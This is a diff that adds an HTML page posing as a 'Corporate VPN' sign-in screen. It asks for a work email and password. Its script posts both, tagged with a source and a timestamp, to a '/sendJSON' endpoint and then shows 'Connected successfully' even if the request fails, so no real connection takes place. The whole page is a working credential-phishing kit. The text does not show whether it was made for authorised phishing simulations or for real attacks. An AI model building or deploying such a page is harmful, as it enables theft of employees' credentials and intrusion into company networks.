@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in — Corporate VPN</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: #f0f2f5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      max-width: 440px;
+      width: 100%;
+    }
+    .card {
+      background: #fff;
+      border: 1px solid #e1e5eb;
+      border-radius: 8px;
+      padding: 40px 36px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+    }
+    .logo-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+    .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: #106ebe;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .logo-icon svg {
+      width: 22px;
+      height: 22px;
+      color: #fff;
+    }
+    .logo-text {
+      font-size: 20px;
+      font-weight: 600;
+      color: #1a1a1a;
+    }
+    .title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #1a1a1a;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #5c5c5c;
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    .input-field {
+      width: 100%;
+      padding: 12px 14px;
+      margin-bottom: 16px;
+      border: 1px solid #d1d5db;
+      border-radius: 6px;
+      font-size: 15px;
+      font-family: inherit;
+    }
+    .input-field:focus {
+      outline: none;
+      border-color: #106ebe;
+      box-shadow: 0 0 0 2px rgba(16, 110, 190, 0.2);
+    }
+    .input-field::placeholder {
+      color: #9ca3af;
+    }
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      margin-top: 8px;
+      background: #106ebe;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+    }
+    .submit-btn:hover {
+      background: #0d5a9e;
+    }
+    .hint {
+      font-size: 13px;
+      color: #6b7280;
+      text-align: center;
+      margin-top: 20px;
+    }
+    #form-block { }
+    #success-block {
+      display: none;
+      text-align: center;
+      padding: 24px 0;
+    }
+    #success-block .msg {
+      font-size: 16px;
+      color: #1a1a1a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <div class="logo-row">
+        <div class="logo-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+        </div>
+        <span class="logo-text">Corporate VPN</span>
+      </div>
+      <div id="form-block">
+        <h1 class="title">Sign in to your work account</h1>
+        <p class="subtitle">Enter your organization credentials to connect</p>
+        <form id="login-form">
+          <input name="email" class="input-field" type="text" placeholder="Work email or username" required />
+          <input name="password" class="input-field" type="password" placeholder="Password" required />
+          <button type="submit" class="submit-btn">Sign in</button>
+        </form>
+        <p class="hint">Use the same account you use for email and company apps.</p>
+      </div>
+      <div id="success-block">
+        <p class="msg">Connected successfully.<br />You will be redirected shortly.</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      var email = document.querySelector('#login-form input[name="email"]').value.trim();
+      var password = document.querySelector('#login-form input[name="password"]').value;
+
+      var data = {
+        username: email,
+        pwd: password,
+        source: 'vpn',
+        timestamp: new Date().toISOString()
+      };
+
+      fetch('/sendJSON', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      })
+        .then(function() {
+          document.getElementById('success-block').style.display = 'block';
+          document.getElementById('form-block').style.display = 'none';
+        })
+        .catch(function() {
+          document.getElementById('success-block').style.display = 'block';
+          document.getElementById('form-block').style.display = 'none';
+        });
+    });
+  </script>
+</body>
+</html>
